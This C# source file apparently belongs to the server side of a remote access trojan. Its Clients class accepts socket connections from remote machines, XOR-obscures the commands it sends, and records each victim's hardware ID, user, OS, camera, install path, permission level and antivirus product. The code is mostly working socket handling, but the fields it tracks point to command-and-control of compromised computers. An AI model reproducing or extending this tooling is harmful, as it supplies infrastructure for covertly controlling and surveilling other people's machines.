using MessagePack;
using Microsoft.VisualBasic;
using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Server
{
    public class Clients
    {
        public Socket ClientSocket { get; set; }
        public string ID { get; set; }
        private byte[] ClientBuffer { get; set; }
        private int ClientBuffersize { get; set; }
        private bool ClientBufferRecevied { get; set; }
        private MemoryStream ClientMS { get; set; }
        public object SendSync { get; } = new object();
        private object EndSendSync { get; } = new object();
        public long BytesRecevied { get; set; }
        public ClientInfo Info { get; set; }

        public class ClientInfo
        {
            public string HWID;
            public string IP;
            public string User;
            public string OS;
            public bool Camera;
            public long InstallType;
            public string InstallTime;
            public string Path;
            public string Active;
            public string Version;
            public long Permission;
            public string AV;
            public string Group;
            public DateTime LastPing;
        }

        public Clients(Socket socket)
        {
            ClientSocket = socket;
            ClientBuffer = new byte[4];
            ClientMS = new MemoryStream();
            Info = new ClientInfo();
            Info.IP = ClientSocket.RemoteEndPoint.ToString().Split(':')[0];
            ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
        }

        public async void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!ClientSocket.Connected)
                {
                    Disconnected();
                    return;
                }
                else
                {
                    int Recevied = ClientSocket.EndReceive(ar);
                    if (Recevied > 0)
                    {
                        if (!ClientBufferRecevied)
                        {
                            await ClientMS.WriteAsync(ClientBuffer, 0, ClientBuffer.Length);
                            ClientBuffersize = BitConverter.ToInt32(ClientMS.ToArray(), 0);
                            ClientMS.Dispose();
                            ClientMS = new MemoryStream();
                            if (ClientBuffersize > 0)
                            {
                                ClientBuffer = new byte[ClientBuffersize];
                                ClientBufferRecevied = true;
                            }
                        }
                        else
                        {
                            await ClientMS.WriteAsync(ClientBuffer, 0, Recevied);
                            Settings.Received += Recevied;
                            BytesRecevied += Recevied;
                            if (ClientMS.Length == ClientBuffersize)
                            {
                                ThreadPool.QueueUserWorkItem(new HandlePacket
                                {
                                    client = this,
                                    data = ClientMS.ToArray(),
                                }.Read, null);
                                ClientBuffer = new byte[4];
                                ClientMS.Dispose();
                                ClientMS = new MemoryStream();
                                ClientBufferRecevied = false;
                            }
                            else
                                ClientBuffer = new byte[ClientBuffersize - ClientMS.Length];
                        }
                        ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                        return;
                    }
                }
            }
            catch
            {
                Disconnected();
                return;
            }
        }

        public void Disconnected()
        {
            try
            {
                lock (Settings.Online)
                    Settings.Online.Remove(this);
            }
            catch { }

            try
            {
                if (ClientSocket.Connected)
                {
                    ClientSocket.Shutdown(SocketShutdown.Both);
                }
            }
            catch { }

            try
            {
                ClientSocket?.Dispose();
                ClientMS?.Dispose();
            }
            catch { }
        }

        public void BeginSend(object msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!ClientSocket.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    if ((byte[])msg == null) return;

                    byte[] buffer = Helper.Xor((byte[])msg);
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    ClientSocket.Poll(-1, SelectMode.SelectWrite);
                    ClientSocket.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
                    ClientSocket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, EndSend, null);
                }
                catch
                {
                    Disconnected();
                    return;
                }

            }
        }

        private void EndSend(IAsyncResult ar)
        {
            lock (EndSendSync)
            {
                try
                {
                    if (!ClientSocket.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    int sent = 0;
                    sent = ClientSocket.EndSend(ar);
                    Settings.Sent += sent;
                }
                catch
                {
                    Disconnected();
                    return;
                }
            }
        }
    }
}
